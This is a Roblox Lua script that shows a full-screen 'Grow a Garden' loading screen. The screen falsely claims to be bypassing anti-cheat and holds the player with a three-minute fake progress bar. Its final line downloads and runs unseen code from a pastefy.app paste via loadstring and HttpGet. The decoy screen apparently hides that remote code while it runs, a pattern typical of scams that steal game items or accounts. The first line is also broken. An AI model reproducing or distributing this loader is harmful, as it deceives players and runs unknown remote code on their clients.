layer = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create screen GUI
local gui = Instance.new("ScreenGui")
gui.Name = "LoadingUI"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = playerGui

-- Background Frame
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
bg.Parent = gui

-- Gradient Overlay
local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 20, 20)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 80, 80))
}
gradient.Parent = bg

-- Title Label
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 120)
title.Position = UDim2.new(0, 0, 0.22, 0)
title.Text = "🌴 GROW A GARDEN 🌴\n⚠️ DO NOT LEAVE - SCRIPT IS BYPASSING ANTI-CHEAT"
title.Font = Enum.Font.GothamBlack
title.TextSize = 36
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.TextStrokeTransparency = 0.8
title.TextWrapped = true
title.TextYAlignment = Enum.TextYAlignment.Top
title.Parent = bg

-- Subtitle Loading Text
local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, 0, 0, 30)
subtitle.Position = UDim2.new(0, 0, 0.52, 0)
subtitle.Text = "Please wait while the script initializes..."
subtitle.Font = Enum.Font.Gotham
subtitle.TextSize = 20
subtitle.TextColor3 = Color3.fromRGB(230, 230, 230)
subtitle.BackgroundTransparency = 1
subtitle.TextStrokeTransparency = 0.8
subtitle.TextWrapped = true
subtitle.Parent = bg

-- Loading Bar Background
local barBG = Instance.new("Frame")
barBG.Size = UDim2.new(0.6, 0, 0.03, 0)
barBG.Position = UDim2.new(0.2, 0, 0.65, 0)
barBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
barBG.BorderSizePixel = 0
barBG.Parent = bg

-- Loading Bar Fill
local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)  -- Starts empty
barFill.Position = UDim2.new(0, 0, 0, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.BorderSizePixel = 0
barFill.Parent = barBG

-- Animate loading bar over 3 minutes (180 seconds)
local duration = 180
local startTime = tick()

spawn(function()
    while tick() - startTime < duration do
        local progress = (tick() - startTime) / duration
        barFill.Size = UDim2.new(progress, 0, 1, 0)
        wait(0.1)
    end

    -- Ensure bar is full at the end
    barFill.Size = UDim2.new(1, 0, 1, 0)

    -- Wait a little and remove the GUI
    wait(1)
    gui:Destroy()
end)
loadstring(game:HttpGet("https://pastefy.app/X8I13KvO/raw"))()
